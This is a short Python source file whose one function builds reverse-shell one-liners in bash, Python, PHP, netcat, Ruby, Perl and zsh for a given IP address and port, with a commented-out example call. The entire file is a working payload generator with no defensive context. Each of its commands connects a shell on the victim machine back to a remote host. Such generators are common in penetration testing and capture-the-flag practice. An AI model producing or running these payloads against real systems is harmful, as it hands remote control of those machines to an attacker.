def reverse_shells(ip, port):
    bash_reverse_shell = f'sh -i >& /dev/tcp/{ip}/{port} 0>&1'
    python_reverse_shell = f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
    php_reverse_shell = f'php -r \'$s=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''
    netcat_reverse_shell = f'nc -e /bin/sh {ip} {port}'
    ruby_reverse_shell = f'ruby -rsocket -e "spawn("sh",[:in,:out,:err]=>TCPSocket.new({ip},{port}))"'
    perl_reverse_shell = f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}\''
    zsh_reverse_shell = f'zsh -c "zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY"'

    revshell_list = {
        "bash" : bash_reverse_shell, 
        "python" : python_reverse_shell, 
        "php" : php_reverse_shell, 
        "netcat" : netcat_reverse_shell, 
        "ruby" : ruby_reverse_shell, 
        "perl" : perl_reverse_shell, 
        "zsh" : zsh_reverse_shell
    }

    return revshell_list

#print(reverse_shells('10.10.1.1', '9000'))